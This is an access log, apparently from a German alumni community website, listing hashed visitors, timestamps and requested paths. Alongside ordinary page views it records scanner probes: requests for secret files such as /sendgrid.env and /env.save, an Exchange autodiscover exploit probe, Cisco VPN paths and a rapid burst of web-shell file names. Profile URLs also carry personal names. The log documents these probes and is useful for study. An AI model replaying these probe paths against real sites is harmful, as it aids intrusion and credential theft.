user;timestamp;referer;target;method;status
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-06 23:05:28;;/register;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-06 23:06:45;;/personen/alumni/schule/0351;GET;200
03040fc47888d54a386842adb7233482b366d303a945cc398eabdbd59f3b4fc0;2025-11-06 23:07:25;;/;GET;200
964b79cf1368ea211cd42bc6a8d060e9b0a365f1952c961b9d3ea517598e3dfb;2025-11-06 23:07:36;;/_profiler/phpinfo;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-06 23:08:09;;/login;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-06 23:09:33;;/about/allgemein;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-06 23:10:58;;/;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-06 23:12:21;/personen/all/4;/personen/alumni/details/luca-onorini;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-06 23:13:43;/gruppen;/gruppen/hobby/musikproduktion;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-06 23:23:11;/gruppen;/gruppen/interesse/teamarbeit;GET;200
5569555c938a3ada6db5a0d128fd71ac7fff4ff03a32b32a0945d4e3be02587f;2025-11-06 23:34:33;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-06 23:44:28;/aktuelles/meldungen;/personen/alumni/schule/HS001;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-06 23:45:52;/personen/alumni/details/josephine-muller;/gruppen/hobby/politik-und-debatten;GET;200
b6f06127c1b32b36e7432fbff0d55977032805de3fe6384670d28328b6d1981b;2025-11-06 23:46:52;;/;GET;200
536c6eafe34df3526e94f7f4aca481ffe6c468fd93b8b585cd16ccf0608c95a0;2025-11-06 23:47:06;;/;GET;200
b6f06127c1b32b36e7432fbff0d55977032805de3fe6384670d28328b6d1981b;2025-11-06 23:49:47;;/.well-known/security.txt;GET;404
c7b31be2a1374d5ab657723015e630b4be5d432a9caedcf617bf337cb2add941;2025-11-06 23:56:20;;/;GET;200
cee154ef39a75d0b4e2c8ef27b63e42d6e5a81c942d2602f35bf97927210c8ed;2025-11-07 00:03:44;;/sendgrid.env;GET;404
cee154ef39a75d0b4e2c8ef27b63e42d6e5a81c942d2602f35bf97927210c8ed;2025-11-07 00:03:44;;/env.save;GET;404
ecb03b0afc89b896c08466bb272b4ea8e8d851587b3053cd75f56735a03ca612;2025-11-07 00:11:22;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-07 00:11:25;/login;/reset-password;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-07 00:12:57;/aktuelles/meldungen;/personen/alumni/schule/59013;GET;200
7724041977a2106a702b74539f3bc4b574f0b27b6b6fcfec0b7e1b962c9b38f9;2025-11-07 00:23:24;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
a0d48d1cf1d49918007593f89c7b8245e66e5a8e23421df6d7db4a51965fed0f;2025-11-07 00:26:38;;/;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-07 00:28:13;/themen/details/gemeinsam-stark-organisiert;/themen?category=community;GET;200
8e6559bff414e06f98912f3ec75c0da21f9bdf5adc603f435b269e2b81ccf97d;2025-11-07 00:52:33;;/;GET;200
f2938cfcab3068d37bf35187cdabe95f51f268cb88a34129d53048d027c29b38;2025-11-07 00:56:21;;/;GET;200
a720143bb9bfcafab25268a78fe8a55b03bf6878ffc5b5f6898dbe48d2d3dc7c;2025-11-07 00:58:43;;/;GET;200
37eecc1f2041348110b9101ee2703c810e61ccd87f99976d5fc0279ac90718a5;2025-11-07 00:59:10;;/gruppen/hobby/diy-projekte;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-07 01:05:04;/aktuelles/meldungen;/personen/alumni/schule/5503;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-07 01:06:32;/personen/alumni/details/josephine-muller;/gruppen/hobby/kulturelle-studien;GET;200
97ebed3d51b552258c50b9b9fbf164c2c7c8a7d83cfee408f34ce45c0376d656;2025-11-07 01:14:14;;/;GET;200
528e680dd2c4da6f6b16687959263fcdf94a346f5a7894d4d1063dd917ed51df;2025-11-07 01:35:54;/;/;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-07 01:45:28;/aktuelles/meldungen;/personen/alumni/schule/620014;GET;200
45a604c9886f43fd4351430bb0986a056daacf7d04657e0bf50d7b2f42b31915;2025-11-07 02:04:34;;/developmentserver/metadatauploader;GET;404
34af1be451c29605cf296d08516cee74703accf2e0212bfe46e0f704a612d39a;2025-11-07 02:04:48;;/;GET;200
6604894891341a817bba4f83a2a03a7a2392aa82f03ef75dac1ace58cd1dcdf0;2025-11-07 02:06:59;/;/;GET;200
1d0005774361014c3ef5fa1ce64125ba4748f1944f3e543ee4c503096d16cb8f;2025-11-07 02:11:23;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
f4bd079bbaafb526441e39527eab130bbd5263c0170b0f394bd82cf3b2c352df;2025-11-07 02:23:27;;/;GET;200
8cfea13a62d596b2e1c87a1c8d3ca5a5aa707a5ccc4f0e050563bd668207e230;2025-11-07 02:23:32;;/personen/alumni/schule/4440012;GET;200
8cfea13a62d596b2e1c87a1c8d3ca5a5aa707a5ccc4f0e050563bd668207e230;2025-11-07 02:23:38;;/personen/alumni/schule/5502;GET;200
8cfea13a62d596b2e1c87a1c8d3ca5a5aa707a5ccc4f0e050563bd668207e230;2025-11-07 02:23:40;;/personen/alumni/schule/5511;GET;200
8cfea13a62d596b2e1c87a1c8d3ca5a5aa707a5ccc4f0e050563bd668207e230;2025-11-07 02:23:44;;/personen/alumni/schule/4440541;GET;200
8cfea13a62d596b2e1c87a1c8d3ca5a5aa707a5ccc4f0e050563bd668207e230;2025-11-07 02:23:49;;/personen/alumni/schule/4540118;GET;200
8cfea13a62d596b2e1c87a1c8d3ca5a5aa707a5ccc4f0e050563bd668207e230;2025-11-07 02:23:52;;/personen/alumni/schule/164094;GET;200
34f3c2a8bb874ca7e215b2127f542d966fa99e46434ecc9f8ca1cba82b616eb8;2025-11-07 02:44:42;;/;GET;200
34f3c2a8bb874ca7e215b2127f542d966fa99e46434ecc9f8ca1cba82b616eb8;2025-11-07 02:44:42;;/;GET;200
b9626bfe59503301a731410cdd44bbace8f4bad9235df2d64f4f761c35bf79c4;2025-11-07 03:03:29;;/;GET;200
096d06be9fb153a9c0a5f0b4d8135e5d0c6959d6b7f3b4008de86fe9511fb5e7;2025-11-07 03:06:59;;/gruppen/hobby/biologie;GET;200
5667a28fd17b93daa042169fdaa5d19c2f368c9481af3a32fe4039af608354b3;2025-11-07 03:13:50;;/;GET;200
22f8595e350c5a6e9f884caaaad8bf47bb33305cc77c55a6f48a190b9622d124;2025-11-07 03:19:43;;/+CSCOL+/Java.jar;GET;404
22f8595e350c5a6e9f884caaaad8bf47bb33305cc77c55a6f48a190b9622d124;2025-11-07 03:19:44;;/+CSCOE+/logon_forms.js;GET;404
22f8595e350c5a6e9f884caaaad8bf47bb33305cc77c55a6f48a190b9622d124;2025-11-07 03:19:45;;/+CSCOL+/a1.jar;GET;404
22f8595e350c5a6e9f884caaaad8bf47bb33305cc77c55a6f48a190b9622d124;2025-11-07 03:19:46;;/+CSCOE+/transfer.js;GET;404
43dd7ebe0dc20eab0ca6fe015df0f6011ab8cfec048e4ed357cebad4377b7d9f;2025-11-07 03:23:51;;/;GET;200
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:54;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:54;;/wp-blog.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:54;;/webdb.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:54;;/witmmm.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:55;;/18299.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:55;;/zxasd.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:55;;/nxx.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:55;;/shlo.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:55;;/sql.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:55;;/Marvins.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:55;;/wpfile.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:55;;/foyhd.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:55;;/f350.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:55;;/moon.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:55;;/bless3.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:56;;/link.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:56;;/CmKHK.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:56;;/rtg.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:56;;/tools.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:56;;/term.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:56;;/fluentform.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:56;;/agqpec.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:56;;/byuri.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:56;;/axx.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:56;;/oiko6u.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:56;;/wp-admin/oiko6u.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:57;;/11.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:57;;/9WOLF.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:57;;/a.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:57;;/f35.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:57;;/crew.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:57;;/gm.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:57;;/pass.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:57;;/sx_pms.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:57;;/btex.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:57;;/ms.php;GET;404
038fcf096961873b2a03e66d7fcc4a2bb00ac2d78b22a91c210a73ba5f93a0d4;2025-11-07 03:25:57;;/lptlo.php;GET;404
